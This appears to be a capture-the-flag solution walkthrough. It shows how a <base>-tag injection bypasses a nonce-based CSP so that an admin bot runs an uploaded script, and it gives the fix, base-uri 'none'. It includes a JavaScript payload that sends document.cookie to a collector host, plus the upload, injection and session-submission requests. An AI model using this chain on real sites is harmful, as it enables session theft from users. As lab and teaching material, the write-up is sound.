Full chain.

1. Upload your bundle (served same-origin at `/u/<id>/main.js`):

```
POST /upload
Content-Type: application/json

{"js":"new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie);"}
```

Note the returned `id`. (Injecting `<script src="/u/<id>/main.js">` **directly**
gets you nowhere — no nonce, so the CSP blocks it. That is the whole reason the
base-uri step exists.)

2. Queue a page load whose `?ref=` injects a `<base>` pointing at your upload's
   directory (mind the **trailing slash** — the base URL is treated as a directory,
   so `/u/<id>/` makes `main.js` → `/u/<id>/main.js`, while `/u/<id>` would give
   `/u/main.js`):

```
POST /report
Content-Type: application/json

{"url":"/?ref=<base href=\"/u/<id>/\">"}
```

(URL-encode the `ref` value.) Wait ~2s. The admin bot loads the page; the injected
`<base>` makes the page's **own nonced** `<script src="main.js">` resolve to your
same-origin upload — and because the nonce is on the element, it loads with a valid
nonce and runs. Your bundle beacons the cookie.

3. Read the collector and submit the session:

```
GET  /oob/received        # item path like /report?c=session%3D<32 hex>

POST /solve
Content-Type: application/json

{"c":"<32 hex>"}
```

and you get `FLAG{…}`. `tests/exploit.py` runs the whole flow — and first proves a
**direct** `<script src="/u/<id>/main.js">` yields **0 beacons** (the nonce blocks
it), so the `<base>` redirect is the only path. The one-line fix is
`base-uri 'none'` in the CSP — add it and the `<base>` injection is ignored.
